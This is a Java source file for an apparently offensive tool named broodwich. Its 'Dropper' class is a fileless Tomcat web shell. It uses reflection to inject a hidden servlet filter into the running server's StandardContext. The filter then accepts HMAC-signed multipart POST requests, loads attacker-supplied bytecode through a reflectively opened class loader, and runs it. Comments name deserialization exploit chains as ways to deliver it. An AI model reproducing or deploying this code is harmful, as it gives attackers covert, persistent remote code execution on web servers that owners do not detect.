package party.itistimeto.broodwich;

// note: java 7+ lang level currently
// todo: test various exploit methods
// for starters, commons collections 4, groovy, ognl, maybe orange tsai jenkins
// todo: see if we actually can't use imports
// todo: test on java 9+

// todo: at minimum also jetty
// preferred third option probably wildfly (or undertow?), four weblogic

public class Dropper implements javax.servlet.Filter {
    private final java.lang.String macAlgo = "HmacSHA256";
    private javax.crypto.SecretKey secretKey;
    public static final java.lang.String digestKey = "broodwichDigest";
    public static final java.lang.String moduleIdKey = "broodwichModuleId";
    public static final java.lang.String payloadKey = "broodwichCommand";
    public static final java.lang.String moduleParamsKey = "broodwichParams";
    public static final java.lang.String payloadLengthKey = "broodwichLength";
    private static final java.lang.String filterName = "broodwich";
    private java.util.concurrent.ConcurrentMap<java.lang.String, java.lang.reflect.Method> modules;

    public static void taste(javax.servlet.http.HttpServlet servlet, byte[] key) {
        javax.servlet.ServletContext contextFacade = servlet.getServletContext();
        if (!contextFacade.getFilterRegistrations().containsKey(filterName)) {
            try {
                // reflection magic
                // 1. we need to manipulate the StandardContext, so we have to grab the ApplicationContext
                // field from the ApplicationContextFacade returned by getServletContext, then ask it for
                // the StandardContext
                // TODO: test on earlier tomcat versions
                java.lang.reflect.Field contextField = servlet.getServletContext().getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                org.apache.catalina.core.ApplicationContext context = (org.apache.catalina.core.ApplicationContext) contextField.get(contextFacade);
                java.lang.reflect.Method getContextMethod = context.getClass().getDeclaredMethod("getContext");
                getContextMethod.setAccessible(true);
                org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) getContextMethod.invoke(context);
                // 2. to add the filter, we need to use StandardContext's public methods addFilterDef and
                // addFilterMap, as well as manipulate its filterConfigs map directly; filter configs require
                // use of a protected constructor
                java.lang.reflect.Constructor afcConstructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class);
                afcConstructor.setAccessible(true);
                java.lang.reflect.Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);

                // create filter definition
                org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
                filterDef.setFilterName(filterName);
                filterDef.setFilter(new party.itistimeto.broodwich.Dropper(key));

                // create filter map
                org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
                filterMap.setFilterName(filterName);
                filterMap.addURLPattern("/*");
                // TODO: or should we use "upper" context?
                for(String servletName : standardContext.getServletContext().getServletRegistrations().keySet()) {
                    filterMap.addServletName(servletName);
                }
                filterMap.setDispatcher(javax.servlet.DispatcherType.REQUEST.name());

                // create filter config
                org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) afcConstructor.newInstance(standardContext, filterDef);

                // add definition, map, and config, synchronized on context's config map
                // todo: will this lock requests on high-traffic server? hopefully light enough that it won't
                java.util.Map<String, org.apache.catalina.core.ApplicationFilterConfig> filterConfigs = (java.util.Map<String, org.apache.catalina.core.ApplicationFilterConfig>) filterConfigsField.get(standardContext);
                synchronized (filterConfigsField.get(standardContext)) {
                    // TODO: do we need to use addFilterDef?
                    standardContext.addFilterDef(filterDef);
                    standardContext.addFilterMap(filterMap);
                    filterConfigs.put(filterName, filterConfig);
                }
            } catch (java.lang.ReflectiveOperationException e) {
                e.printStackTrace();
            }
        }
    }

    private Dropper(byte[] secretKey) {
        super();
        this.secretKey = new javax.crypto.spec.SecretKeySpec(secretKey, macAlgo);
    }

    @Override
    public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {
        // todo: concurrent map necessary?
        // todo: store in servlet context or just in this class?
        modules = new java.util.concurrent.ConcurrentHashMap<>();
        //filterConfig.getServletContext().setAttribute(modulesAttribute, modules);
    }

    @Override
    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {
        // todo: multipart is only natively supported on servlet 3.0+
        // todo: decide if want to implement alternate method (e.g., apache commons, application/octet-stream)
        javax.servlet.http.HttpServletRequest httpServletRequest = (javax.servlet.http.HttpServletRequest) servletRequest;
        if (httpServletRequest.getMethod().equals("POST") && httpServletRequest.getContentType().equals("multipart/form-data")) {
            // todo: handle "java.lang.IllegalStateException: Unable to process parts as no multi-part configuration has been provided"
            java.util.Collection<javax.servlet.http.Part> parts = httpServletRequest.getParts();
            if(!parts.isEmpty()) {
                byte[] compressedPayload = null;
                String moduleId = null;
                byte[] digest = null;
                byte[] moduleParams = null;
                int payloadLength = 0;

                for(javax.servlet.http.Part part : parts) {
                    switch (part.getName()) {
                        case payloadKey:
                            compressedPayload = new byte[(int)part.getSize()];
                            new java.io.DataInputStream(part.getInputStream()).readFully(compressedPayload);
                            break;
                        case moduleIdKey:
                            byte[] moduleIdBytes = new byte[(int)part.getSize()];
                            new java.io.DataInputStream(part.getInputStream()).readFully(moduleIdBytes);
                            moduleId = java.util.Arrays.toString(moduleIdBytes);
                            break;
                        case digestKey:
                            digest = new byte[(int)part.getSize()];
                            new java.io.DataInputStream(part.getInputStream()).readFully(digest);
                            break;
                        case moduleParamsKey:
                            moduleParams = new byte[(int)part.getSize()];
                            new java.io.DataInputStream(part.getInputStream()).readFully(moduleParams);
                            break;
                        case payloadLengthKey:
                            byte[] payloadLengthBytes = new byte[(int)part.getSize()];
                            new java.io.DataInputStream(part.getInputStream()).readFully(payloadLengthBytes);
                            payloadLength = java.nio.ByteBuffer.wrap(payloadLengthBytes).order(java.nio.ByteOrder.BIG_ENDIAN).asIntBuffer().get();
                            break;
                    }
                }

                if(compressedPayload != null && moduleId != null && digest != null && payloadLength > 0) {
                    try {
                        javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlgo);
                        mac.init(secretKey);
                        byte[] computedDigest = mac.doFinal(compressedPayload);

                        // todo: timing attacks etc.
                        if(java.util.Arrays.equals(computedDigest, digest)) {
                            byte[] payload = new byte[payloadLength];
                            new java.io.DataInputStream(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(compressedPayload))).readFully(payload);

                            if(moduleId.equals("party.itistimeto.broodwich.modules.loader") && moduleParams != null) {
                                try {
                                    // load class
                                    Class sclClazz = java.security.SecureClassLoader.class;
                                    java.lang.reflect.Constructor sclConstructor = sclClazz.getDeclaredConstructor();
                                    sclConstructor.setAccessible(true);
                                    java.security.SecureClassLoader scl = (java.security.SecureClassLoader) sclConstructor.newInstance(null);
                                    java.lang.reflect.Method defineClass = sclClazz.getDeclaredMethod("defineClass", String.class, java.nio.ByteBuffer.class, java.security.CodeSource.class);
                                    defineClass.setAccessible(true);
                                    Class moduleClass = (Class) defineClass.invoke(scl, java.util.Arrays.toString(moduleParams), java.nio.ByteBuffer.wrap(payload), null);

                                    try {
                                        java.lang.reflect.Method runModule = moduleClass.getDeclaredMethod("runModule", byte[].class);
                                        modules.put(moduleId, runModule);
                                    }
                                    catch (NoSuchMethodException e) {
                                        // idk
                                    }
                                } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
                                    e.printStackTrace();
                                }
                            }
                            else {
                                java.lang.reflect.Method runModule = modules.get(moduleId);
                                if (runModule != null) {
                                    runModule.invoke(null, (Object) moduleParams);
                                }
                            }
                        }
                    } catch (java.security.NoSuchAlgorithmException | java.security.InvalidKeyException | IllegalAccessException | java.lang.reflect.InvocationTargetException e) {
                        e.printStackTrace();
                    }
                }
            }
        }

    }

    @Override
    public void destroy() {

    }
}